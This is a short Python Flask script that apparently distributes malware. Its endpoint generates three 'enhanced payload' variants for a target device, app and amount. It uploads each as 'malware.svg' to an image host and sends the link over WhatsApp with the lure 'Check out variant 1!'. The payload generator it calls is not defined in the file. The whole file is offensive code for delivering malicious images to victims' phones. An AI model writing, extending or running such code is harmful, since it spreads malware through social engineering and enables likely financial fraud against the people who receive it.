import requests
import uuid
from flask import Flask, request

app = Flask(__name__)

@app.route('/whatsapp', methods=['POST'])
def whatsapp():
    device_id = request.json.get('device_id')
    target_app = request.json.get('target_app')
    target_amount = request.json.get('target_amount')
    
    # Create multiple variants to increase chances
    variants = []
    for i in range(3):
        variant = generate_enhanced_payload(f"{device_id}_{i}", target_app, target_amount)
        variants.append(variant)
    
    # Upload and send multiple versions
    for i, variant in enumerate(variants):
        files = {'file': ('malware.svg', variant)}
        resp = requests.post('https://api.imagehost.com/upload', files=files)
        
        if resp.status_code == 200:
            image_url = resp.json()['url']
            
            # Send via WhatsApp
            wa_resp = requests.post('https://api.whatsapp.com/send', json={
                'to': '+1234567890',
                'text': f'Check out variant {i+1}!',
                'media': image_url
            })
    
    return {'status': 'sent', 'variants': len(variants)}

if __name__ == '__main__':
    app.run(debug=True)
